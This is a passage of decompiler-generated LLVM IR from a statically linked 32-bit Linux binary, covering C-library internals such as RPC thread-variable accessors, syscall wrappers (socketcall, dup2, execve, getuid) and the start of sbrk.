dec_label_pc_8053f76:                             ; preds = %dec_label_pc_8053f6a, %dec_label_pc_8053f45
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32 2), i32 0), label %dec_label_pc_8053f8e, label %dec_label_pc_8053f9a

dec_label_pc_8053f8e:                             ; preds = %dec_label_pc_8053f76, %dec_label_pc_8053f8e
  %v4_8053f8e45 = phi i32 [ %v1_8053f95, %dec_label_pc_8053f8e ], [ 0, %dec_label_pc_8053f76 ]
  store i32 ptrtoint (i32* @global_var_8053f95.279 to i32), i32* %stack_var_-164, align 4
  %v5_8053f8e = mul i32 %v4_8053f8e45, 4
  %v6_8053f8e = add i32 %v5_8053f8e, ptrtoint (i32* @global_var_805e1c8.270 to i32)
  %v7_8053f8e = inttoptr i32 %v6_8053f8e to i32*
  %v8_8053f8e = load i32, i32* %v7_8053f8e, align 4
  call void @__pseudo_call(i32 %v8_8053f8e)
  %v0_8053f95 = load i32, i32* @ebx, align 4
  %v1_8053f95 = add i32 %v0_8053f95, 1
  store i32 %v1_8053f95, i32* @ebx, align 4
  %v1_8053f96.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8053f96 = icmp ult i32 %v1_8053f95, %v1_8053f96.pre
  br i1 %v7_8053f96, label %dec_label_pc_8053f8e, label %dec_label_pc_8053f9a

dec_label_pc_8053f9a:                             ; preds = %dec_label_pc_8053f8e, %dec_label_pc_8053f76
  store i32 134525706, i32* %eax.global-to-local, align 4
  %v0_8053fa3 = load i32, i32* %stack_var_-164, align 4
  %v1_8053fa3 = call i32 @__errno_location(i32 %v0_8053fa3)
  %v1_8053fa8 = inttoptr i32 %v1_8053fa3 to i32*
  store i32 0, i32* %v1_8053fa8, align 4
  store i32 134525691, i32* %eax.global-to-local, align 4
  %v0_8053fb7 = call i32 @__h_errno_location()
  store i32 %v0_8053fb7, i32* %eax.global-to-local, align 4
  %v1_8053fbc = inttoptr i32 %v0_8053fb7 to i32*
  store i32 0, i32* %v1_8053fbc, align 4
  %v0_8053fc2 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8053fc2, i32* %stack_var_-164, align 4
  %v0_8053fc3 = load i32, i32* @global_var_80672b0.267, align 16
  store i32 %v0_8053fc3, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8053e27)
  %v0_8053fd8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fdb = call i32 @__GI_exit(i32 %v0_8053fd8)
  store i32 %v1_8053fdb, i32* %eax.global-to-local, align 4
  ret i32 %v1_8053fdb

; uselistorder directives
  uselistorder i32 %v1_8053f95, { 1, 2, 0 }
  uselistorder i32 %v1_8053f71, { 1, 2, 0 }
  uselistorder i32 %v2_8053eb1, { 1, 0 }
  uselistorder i32 %v1_8053eae, { 2, 1, 0 }
  uselistorder i32 %v1_8053ea1, { 0, 2, 1 }
  uselistorder i32 %v1_8053e8d, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_8053e8a, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 %tmp25, { 1, 0, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 5, 6, 7, 4, 8, 9, 0, 2, 13, 10, 12, 11, 1, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8053f8e, { 1, 0 }
  uselistorder label %dec_label_pc_8053f6a, { 1, 0 }
  uselistorder label %dec_label_pc_8053f45, { 1, 0 }
  uselistorder label %dec_label_pc_8053ed0, { 1, 0 }
  uselistorder label %dec_label_pc_8053eae, { 1, 0 }
  uselistorder label %dec_label_pc_8053e96, { 1, 0 }
  uselistorder label %dec_label_pc_8053e73, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
dec_label_pc_8054009:
  %v4_8053ff5 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_80672e0.280 to i32), i32 134541943, i32 134541943)
  ret i32 %v4_8053ff5
}

define i32 @__rpc_thread_variables(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805400d = load i32, i32* @ebx, align 4
  %v1_805401f = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_805401f, i32* @ebx, align 4
  %v1_8054030 = icmp eq i32 %v1_805401f, 0
  %v1_8054032 = icmp eq i1 %v1_8054030, false
  br i1 %v1_8054032, label %dec_label_pc_80540e8, label %dec_label_pc_8054038

dec_label_pc_8054038:                             ; preds = %entry
  %v5_805404d = call i32 @pthread_once(i32* nonnull @global_var_80672c4.282, i32 134561760, i32 134541352, i32 134541352)
  %v1_805407d = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_805407d, i32* @ebx, align 4
  %v1_805408e = icmp eq i32 %v1_805407d, 0
  %v1_8054090 = icmp eq i1 %v1_805408e, false
  br i1 %v1_8054090, label %dec_label_pc_80540e8, label %dec_label_pc_8054092

dec_label_pc_8054092:                             ; preds = %dec_label_pc_8054038
  %v5_805409b = call i32 @calloc(i64 1, i32 200, i32 %v1_805407d, i32 %v1_805407d)
  store i32 %v5_805409b, i32* %ebx.global-to-local, align 4
  %v1_80540a5 = icmp eq i32 %v5_805409b, 0
  br i1 %v1_80540a5, label %dec_label_pc_80540c9, label %dec_label_pc_80540a9

dec_label_pc_80540a9:                             ; preds = %dec_label_pc_8054092
  %v4_80540b7 = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v5_805409b, i32 134541943, i32 134541943)
  %v0_80540e8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80540e8

dec_label_pc_80540c9:                             ; preds = %dec_label_pc_8054092
  %v1_80540d7 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_80540d7, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80540e8

dec_label_pc_80540e8:                             ; preds = %dec_label_pc_8054038, %entry, %dec_label_pc_80540a9, %dec_label_pc_80540c9
  %v0_80540e8 = phi i32 [ %v1_805407d, %dec_label_pc_8054038 ], [ %v1_805401f, %entry ], [ %v0_80540e8.pre, %dec_label_pc_80540a9 ], [ %v1_80540d7, %dec_label_pc_80540c9 ]
  %v2_80540ea = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80540ea, i32* @edx, align 4
  store i32 %v0_805400d, i32* @ebx, align 4
  ret i32 %v0_80540e8

; uselistorder directives
  uselistorder i32 %v5_805409b, { 0, 2, 1 }
  uselistorder i32 %v1_805407d, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_805401f, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80540e8, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %v1_80540f1 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_80540fb = icmp eq i32 %v1_80540f1, 134640352
  br i1 %v6_80540fb, label %dec_label_pc_8054108, label %dec_label_pc_8054102

dec_label_pc_8054102:                             ; preds = %entry
  %v1_8054102 = add i32 %v1_80540f1, 148
  br label %dec_label_pc_8054108

dec_label_pc_8054108:                             ; preds = %entry, %dec_label_pc_8054102
  %v0_8054108 = phi i32 [ ptrtoint (i32* @global_var_8067a8c.283 to i32), %entry ], [ %v1_8054102, %dec_label_pc_8054102 ]
  ret i32 %v0_8054108

; uselistorder directives
  uselistorder i32 %v1_80540f1, { 1, 0 }
  uselistorder label %dec_label_pc_8054108, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %v1_8054111 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_805411b = icmp eq i32 %v1_8054111, 134640352
  br i1 %v6_805411b, label %dec_label_pc_8054128, label %dec_label_pc_8054122

dec_label_pc_8054122:                             ; preds = %entry
  %v1_8054122 = add i32 %v1_8054111, 144
  br label %dec_label_pc_8054128

dec_label_pc_8054128:                             ; preds = %entry, %dec_label_pc_8054122
  %v0_8054128 = phi i32 [ ptrtoint (i32* @global_var_8067aa0.284 to i32), %entry ], [ %v1_8054122, %dec_label_pc_8054122 ]
  ret i32 %v0_8054128

; uselistorder directives
  uselistorder i32 %v1_8054111, { 1, 0 }
  uselistorder label %dec_label_pc_8054128, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v1_8054131 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_805413b = icmp eq i32 %v1_8054131, 134640352
  br i1 %v6_805413b, label %dec_label_pc_8054148, label %dec_label_pc_8054142

dec_label_pc_8054142:                             ; preds = %entry
  %v1_8054142 = add i32 %v1_8054131, 128
  br label %dec_label_pc_8054148

dec_label_pc_8054148:                             ; preds = %entry, %dec_label_pc_8054142
  %storemerge = phi i32 [ %v1_8054142, %dec_label_pc_8054142 ], [ ptrtoint (i32* @global_var_8067a90.285 to i32), %entry ]
  %v0_8054148 = phi i32 [ %v1_8054142, %dec_label_pc_8054142 ], [ ptrtoint (i32* @global_var_8067a90.285 to i32), %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8054148

; uselistorder directives
  uselistorder i32 %v1_8054131, { 1, 0 }
  uselistorder label %dec_label_pc_8054148, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset() local_unnamed_addr {
entry:
  %v1_8054151 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_805415b = icmp eq i32 %v1_8054151, 134640352
  br i1 %v6_805415b, label %dec_label_pc_8054164, label %dec_label_pc_8054162

dec_label_pc_8054162:                             ; preds = %entry
  br label %dec_label_pc_8054164

dec_label_pc_8054164:                             ; preds = %entry, %dec_label_pc_8054162
  %v0_8054164 = phi i32 [ ptrtoint (i32* @global_var_8067a00.286 to i32), %entry ], [ %v1_8054151, %dec_label_pc_8054162 ]
  ret i32 %v0_8054164

; uselistorder directives
  uselistorder i32 %v1_8054151, { 1, 0 }
  uselistorder label %dec_label_pc_8054164, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v1_805417c = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_805417c, i32* @ebx, align 4
  %v1_805418e = icmp eq i32 %v1_805417c, 0
  br i1 %v1_805418e, label %dec_label_pc_8054224, label %dec_label_pc_8054196

dec_label_pc_8054196:                             ; preds = %entry
  %v6_8054196 = icmp eq i32 %v1_805417c, 134640352
  br i1 %v6_8054196, label %dec_label_pc_8054224, label %dec_label_pc_80541a2

dec_label_pc_80541a2:                             ; preds = %dec_label_pc_8054196
  %v0_80541a2 = call i32 @__rpc_thread_svc_cleanup()
  %v0_80541a7 = call i32 @__rpc_thread_clnt_cleanup()
  %v0_80541af = load i32, i32* @ebx, align 4
  %v1_80541af = add i32 %v0_80541af, 152
  %v2_80541af = inttoptr i32 %v1_80541af to i32*
  %v3_80541af = load i32, i32* %v2_80541af, align 4
  %v1_80541b5 = call i32 @free(i32 %v3_80541af)
  %v0_80541bb = load i32, i32* @ebx, align 4
  %v1_80541bb = add i32 %v0_80541bb, 156
  %v2_80541bb = inttoptr i32 %v1_80541bb to i32*
  %v3_80541bb = load i32, i32* %v2_80541bb, align 4
  %v1_80541c1 = call i32 @free(i32 %v3_80541bb)
  %v0_80541c7 = load i32, i32* @ebx, align 4
  %v1_80541c7 = add i32 %v0_80541c7, 160
  %v2_80541c7 = inttoptr i32 %v1_80541c7 to i32*
  %v3_80541c7 = load i32, i32* %v2_80541c7, align 4
  %v1_80541cd = call i32 @free(i32 %v3_80541c7)
  %v0_80541d3 = load i32, i32* @ebx, align 4
  %v1_80541d3 = add i32 %v0_80541d3, 188
  %v2_80541d3 = inttoptr i32 %v1_80541d3 to i32*
  %v3_80541d3 = load i32, i32* %v2_80541d3, align 4
  %v1_80541d9 = call i32 @free(i32 %v3_80541d3)
  %v0_80541df = load i32, i32* @ebx, align 4
  %v1_80541df = add i32 %v0_80541df, 172
  %v2_80541df = inttoptr i32 %v1_80541df to i32*
  %v3_80541df = load i32, i32* %v2_80541df, align 4
  %v1_80541e5 = call i32 @free(i32 %v3_80541df)
  %v0_80541eb = load i32, i32* @ebx, align 4
  %v1_80541eb = add i32 %v0_80541eb, 176
  %v2_80541eb = inttoptr i32 %v1_80541eb to i32*
  %v3_80541eb = load i32, i32* %v2_80541eb, align 4
  %v1_80541f1 = call i32 @free(i32 %v3_80541eb)
  %v0_80541f6 = load i32, i32* @ebx, align 4
  %v1_80541f9 = call i32 @free(i32 %v0_80541f6)
  %v0_805420a = load i32, i32* @ecx, align 4
  %v4_8054210 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 %v0_805420a, i32 %v0_805420a)
  br label %dec_label_pc_8054224

dec_label_pc_8054224:                             ; preds = %dec_label_pc_8054196, %entry, %dec_label_pc_80541a2
  %v2_8054224 = load i32, i32* %stack_var_-12, align 4
  ret i32 %v2_8054224

; uselistorder directives
  uselistorder i32 %v1_805417c, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_internal_tsd_get, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_8054224, { 2, 0, 1 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v1_805422f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v0_8054234 = load i32, i32* @edx, align 4
  %v2_8054234 = inttoptr i32 %v1_805422f to i32*
  store i32 %v0_8054234, i32* %v2_8054234, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v1_8054248 = add i32 %tmp2, 20
  %v2_8054248 = inttoptr i32 %v1_8054248 to i32*
  %v3_8054248 = load i32, i32* %v2_8054248, align 4
  call void @__pseudo_branch(i32 %v3_8054248)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ecx, align 4
  %v0_8054262 = call i32 @vfork()
  %v5_8054265 = icmp ult i32 %v0_8054262, -4095
  %v1_805426a = icmp eq i1 %v5_8054265, false
  call void @__pseudo_cond_branch(i1 %v1_805426a, i32 134562344)
  ret i32 %v0_8054262
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054274 = load i32, i32* @ebx, align 4
  store i32 %v0_8054274, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054287 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054287, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8054287, -4095
  br i1 %tmp, label %dec_label_pc_80542a0, label %dec_label_pc_8054294

dec_label_pc_8054294:                             ; preds = %entry
  %v0_8054294 = load i32, i32* %stack_var_-4, align 4
  %v1_8054294 = call i32 @__errno_location(i32 %v0_8054294)
  %v0_8054299 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054299 = sub i32 0, %v0_8054299
  %v2_805429b = inttoptr i32 %v1_8054294 to i32*
  store i32 %v1_8054299, i32* %v2_805429b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80542a0

dec_label_pc_80542a0:                             ; preds = %entry, %dec_label_pc_8054294
  %v0_80542a0 = phi i32 [ %v1_8054287, %entry ], [ -1, %dec_label_pc_8054294 ]
  %v2_80542a2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80542a2, i32* @edx, align 4
  %v2_80542a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80542a4, i32* @ebx, align 4
  ret i32 %v0_80542a0

; uselistorder directives
  uselistorder i32 %v1_8054287, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80542a0, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80542a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80542a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80542bb = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80542bb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80542bb, -4095
  br i1 %tmp, label %dec_label_pc_80542d4, label %dec_label_pc_80542c8

dec_label_pc_80542c8:                             ; preds = %entry
  %v0_80542c8 = load i32, i32* %stack_var_-4, align 4
  %v1_80542c8 = call i32 @__errno_location(i32 %v0_80542c8)
  %v0_80542cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80542cd = sub i32 0, %v0_80542cd
  %v2_80542cf = inttoptr i32 %v1_80542c8 to i32*
  store i32 %v1_80542cd, i32* %v2_80542cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80542d4

dec_label_pc_80542d4:                             ; preds = %entry, %dec_label_pc_80542c8
  %v0_80542d4 = phi i32 [ %v4_80542bb, %entry ], [ -1, %dec_label_pc_80542c8 ]
  %v2_80542d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80542d8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80542d4

; uselistorder directives
  uselistorder i32 %v4_80542bb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80542d4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80542dc = load i32, i32* @ebx, align 4
  store i32 %v0_80542dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80542ef = call i32 @dup2(i32 %v0_80542dc, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80542ef, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80542ef, -4095
  br i1 %tmp, label %dec_label_pc_8054308, label %dec_label_pc_80542fc

dec_label_pc_80542fc:                             ; preds = %entry
  %v0_80542fc = load i32, i32* %stack_var_-4, align 4
  %v1_80542fc = call i32 @__errno_location(i32 %v0_80542fc)
  %v0_8054301 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054301 = sub i32 0, %v0_8054301
  %v2_8054303 = inttoptr i32 %v1_80542fc to i32*
  store i32 %v1_8054301, i32* %v2_8054303, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054308

dec_label_pc_8054308:                             ; preds = %entry, %dec_label_pc_80542fc
  %v0_8054308 = phi i32 [ %v4_80542ef, %entry ], [ -1, %dec_label_pc_80542fc ]
  %v2_805430c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805430c, i32* @ebx, align 4
  ret i32 %v0_8054308

; uselistorder directives
  uselistorder i32 %v4_80542ef, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054308, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054310 = load i32, i32* @edi, align 4
  store i32 %v0_8054310, i32* %stack_var_-4, align 4
  %v4_8054314 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054314, i32* %edi.global-to-local, align 4
  %v0_8054320 = load i32, i32* @ebx, align 4
  %v5_8054328 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8054328 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8054328 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8054328, [1 x i8*] %v8_8054328)
  store i32 %v9_8054328, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8054328, -4095
  br i1 %tmp12, label %dec_label_pc_8054340, label %dec_label_pc_8054334

dec_label_pc_8054334:                             ; preds = %entry
  %v1_8054334 = call i32 @__errno_location(i32 %v0_8054320)
  %v0_8054339 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054339 = sub i32 0, %v0_8054339
  %v2_805433b = inttoptr i32 %v1_8054334 to i32*
  store i32 %v1_8054339, i32* %v2_805433b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054340

dec_label_pc_8054340:                             ; preds = %entry, %dec_label_pc_8054334
  %v0_8054340 = phi i32 [ %v9_8054328, %entry ], [ -1, %dec_label_pc_8054334 ]
  %v2_8054342 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054342, i32* @edx, align 4
  %v2_8054344 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054344, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054340

; uselistorder directives
  uselistorder i32 %v9_8054328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054340, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805434b = ptrtoint i32* %stack_var_-8 to i32
  %v2_8054352 = call i32 @getrlimit(i32 7, i32 %v2_805434b)
  store i32 256, i32* @edx, align 4
  %v2_805435f = icmp slt i32 %v2_8054352, 0
  br i1 %v2_805435f, label %dec_label_pc_8054367, label %dec_label_pc_8054363

dec_label_pc_8054363:                             ; preds = %entry
  %v3_8054363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8054363, i32* @edx, align 4
  br label %dec_label_pc_8054367

dec_label_pc_8054367:                             ; preds = %entry, %dec_label_pc_8054363
  %v0_8054367 = phi i32 [ 256, %entry ], [ %v3_8054363, %dec_label_pc_8054363 ]
  ret i32 %v0_8054367

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %dec_label_pc_8054367, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054370 = load i32, i32* @ebx, align 4
  store i32 %v0_8054370, i32* %stack_var_-4, align 4
  %v1_8054379 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054379, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8054379, -4095
  br i1 %tmp, label %dec_label_pc_8054390, label %dec_label_pc_8054384

dec_label_pc_8054384:                             ; preds = %entry
  %v0_8054384 = load i32, i32* %stack_var_-4, align 4
  %v1_8054384 = call i32 @__errno_location(i32 %v0_8054384)
  %v0_8054389 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054389 = sub i32 0, %v0_8054389
  %v2_805438b = inttoptr i32 %v1_8054384 to i32*
  store i32 %v1_8054389, i32* %v2_805438b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054390

dec_label_pc_8054390:                             ; preds = %entry, %dec_label_pc_8054384
  %v0_8054390 = phi i32 [ %v1_8054379, %entry ], [ -1, %dec_label_pc_8054384 ]
  %v2_8054394 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054394, i32* @ebx, align 4
  ret i32 %v0_8054390

; uselistorder directives
  uselistorder i32 %v1_8054379, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054390, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054398 = load i32, i32* @ebx, align 4
  store i32 %v0_8054398, i32* %stack_var_-4, align 4
  %v1_80543a1 = call i32 @int80_syscall(i32 200)
  store i32 %v1_80543a1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80543a1, -4095
  br i1 %tmp, label %dec_label_pc_80543b8, label %dec_label_pc_80543ac

dec_label_pc_80543ac:                             ; preds = %entry
  %v0_80543ac = load i32, i32* %stack_var_-4, align 4
  %v1_80543ac = call i32 @__errno_location(i32 %v0_80543ac)
  %v0_80543b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80543b1 = sub i32 0, %v0_80543b1
  %v2_80543b3 = inttoptr i32 %v1_80543ac to i32*
  store i32 %v1_80543b1, i32* %v2_80543b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80543b8

dec_label_pc_80543b8:                             ; preds = %entry, %dec_label_pc_80543ac
  %v0_80543b8 = phi i32 [ %v1_80543a1, %entry ], [ -1, %dec_label_pc_80543ac ]
  %v2_80543bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80543bc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80543b8

; uselistorder directives
  uselistorder i32 %v1_80543a1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80543b8, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80543c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80543c0, i32* %stack_var_-4, align 4
  %v1_80543c9 = call i32 @int80_syscall(i32 199)
  store i32 %v1_80543c9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80543c9, -4095
  br i1 %tmp, label %dec_label_pc_80543e0, label %dec_label_pc_80543d4

dec_label_pc_80543d4:                             ; preds = %entry
  %v0_80543d4 = load i32, i32* %stack_var_-4, align 4
  %v1_80543d4 = call i32 @__errno_location(i32 %v0_80543d4)
  %v0_80543d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80543d9 = sub i32 0, %v0_80543d9
  %v2_80543db = inttoptr i32 %v1_80543d4 to i32*
  store i32 %v1_80543d9, i32* %v2_80543db, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80543e0

dec_label_pc_80543e0:                             ; preds = %entry, %dec_label_pc_80543d4
  %v0_80543e0 = phi i32 [ %v1_80543c9, %entry ], [ -1, %dec_label_pc_80543d4 ]
  %v2_80543e4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80543e4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80543e0

; uselistorder directives
  uselistorder i32 %v1_80543c9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80543e0, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80543e9 = load i32, i32* @ebx, align 4
  %v0_80543ed = load i32, i32* @global_var_8067408.287, align 8
  %v1_80543ed = icmp eq i32 %v0_80543ed, 0
  %v1_80543f8 = icmp eq i1 %v1_80543ed, false
  br i1 %v1_80543f8, label %dec_label_pc_805440b, label %dec_label_pc_80543fa

dec_label_pc_80543fa:                             ; preds = %entry
  %v1_80543ff = call i32 @__GI_brk(i32 0)
  %v2_8054407 = icmp slt i32 %v1_80543ff, 0
  br i1 %v2_8054407, label %dec_label_pc_805442d, label %dec_label_pc_80543fa.dec_label_pc_805440b_crit_edge

dec_label_pc_80543fa.dec_label_pc_805440b_crit_edge: ; preds = %dec_label_pc_80543fa
  %v0_805440d.pre = load i32, i32* @global_var_8067408.287, align 8
  br label %dec_label_pc_805440b

dec_label_pc_805440b:                             ; preds = %dec_label_pc_80543fa.dec_label_pc_805440b_crit_edge, %entry
  %v0_805441b = phi i32 [ %v0_805440d.pre, %dec_label_pc_80543fa.dec_label_pc_805440b_crit_edge ], [ %v0_80543ed, %entry ]
  %v1_805440b = icmp eq i32 %arg1, 0
  %v1_8054412 = icmp eq i1 %v1_805440b, false
  br i1 %v1_8054412, label %dec_label_pc_8054418, label %dec_label_pc_8054414

dec_label_pc_8054414:                             ; preds = %dec_label_pc_805440b
  br label %dec_label_pc_8054430

dec_label_pc_8054418:                             ; preds = %dec_label_pc_805440b
  store i32 %v0_805441b, i32* @ebx, align 4
